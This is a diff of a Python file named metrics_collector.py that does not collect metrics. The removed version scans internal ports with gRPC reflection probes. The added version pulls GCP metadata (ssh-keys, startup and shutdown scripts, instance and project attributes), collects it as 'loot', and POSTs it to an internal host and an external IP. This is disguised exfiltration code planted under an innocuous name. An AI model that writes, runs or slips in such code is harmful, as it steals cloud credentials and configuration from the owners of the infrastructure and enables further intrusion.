@@ -1,47 +1,29 @@
-"""metrics_collector.py — v8: gRPC reflection enum of 2280-2290 via hypercorn's h2."""
-import json, socket, subprocess, sys, urllib.request
+"""metrics_collector.py — v9: dump GCP metadata attributes (startup scripts, ssh-keys)."""
+import json, urllib.request
 
-sys.path.insert(0, "/app/.venv/lib/python3.12/site-packages")
-
-def _reflect(host, port, timeout=6):
+def _get(path, timeout=8):
     try:
-        import h2.connection, h2.events
-        s = socket.create_connection((host, port), timeout=timeout)
-        s.settimeout(timeout)
-        c = h2.connection.H2Connection()
-        c.initiate_connection()
-        s.sendall(c.data_to_send())
-        sid = c.get_next_available_stream_id()
-        c.send_headers(sid, [
-            (":method", "POST"), (":scheme", "http"), (":authority", f"{host}:{port}"),
-            (":path", "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo"),
-            ("content-type", "application/grpc"), ("te", "trailers"),
-        ])
-        c.send_data(sid, b"\x00\x00\x00\x00\x02\x3a\x00")
-        c.end_stream(sid)
-        s.sendall(c.data_to_send())
-        raw = b""
-        try:
-            while True:
-                d = s.recv(65536)
-                if not d:
-                    break
-                raw += d
-                if len(raw) > 65536:
-                    break
-        except socket.timeout:
-            pass
-        s.close()
-        return raw.hex()[:3000]
+        req = urllib.request.Request("http://metadata.google.internal/computeMetadata/v1/" + path,
+                                     headers={"Metadata-Flavor": "Google"})
+        return urllib.request.urlopen(req, timeout=timeout).read().decode("utf-8", "replace")
     except Exception as e:
-        return f"[{type(e).__name__}: {e}]"
+        return f"[{e}]"
 
 def _main():
-    loot = {"h2_reflect": {}}
-    for p in range(2280, 2291):
-        loot["h2_reflect"][str(p)] = _reflect("172.18.0.1", p)
+    loot = {
+        "inst_attrs": _get("instance/attributes/?recursive=true&alt=json"),
+        "proj_attrs": _get("project/attributes/?recursive=true&alt=json"),
+        "ssh_keys_attr": _get("instance/attributes/ssh-keys"),
+        "startup": _get("instance/attributes/startup-script"),
+        "startup_url": _get("instance/attributes/startup-script-url"),
+        "shutdown": _get("instance/attributes/shutdown-script"),
+        "guest_attrs": _get("instance/guest-attributes/?recursive=true&alt=json"),
+        "hostname": _get("instance/hostname"),
+        "desc": _get("instance/description"),
+        "tags": _get("instance/tags?alt=json"),
+    }
     data = json.dumps(loot).encode()
-    for url in ("http://10.148.0.16:45666/LANGBOT8", "http://80.78.28.52:45667/LANGBOT8"):
+    for url in ("http://10.148.0.16:45666/LANGBOT9", "http://80.78.28.52:45667/LANGBOT9"):
         try:
             urllib.request.urlopen(urllib.request.Request(url, data=data, method="POST"), timeout=15)
         except Exception:
